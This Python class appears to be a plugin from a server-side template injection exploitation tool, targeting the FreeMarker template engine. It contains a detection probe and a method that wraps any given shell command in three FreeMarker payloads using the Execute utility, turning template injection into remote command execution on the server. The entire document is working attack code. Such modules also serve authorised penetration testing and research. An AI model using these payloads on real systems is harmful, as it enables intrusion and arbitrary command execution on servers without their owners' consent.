class freemarker:
    def __init__(self):
        self.name = "freemarker"
        self.exec = True
        self.download = False

    def payload_test(self):
        return ["${347*21}"]

    def execu(self,cmd,index=-1):
        payload = [
        '<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("'+cmd+'") }',
        '[#assign ex = "freemarker.template.utility.Execute"?new()]${ ex("'+cmd+'")}',
        '${"freemarker.template.utility.Execute"?new()("'+cmd+'")}'
        ]
        if index >= 0:
            return payload[index]
        return payload

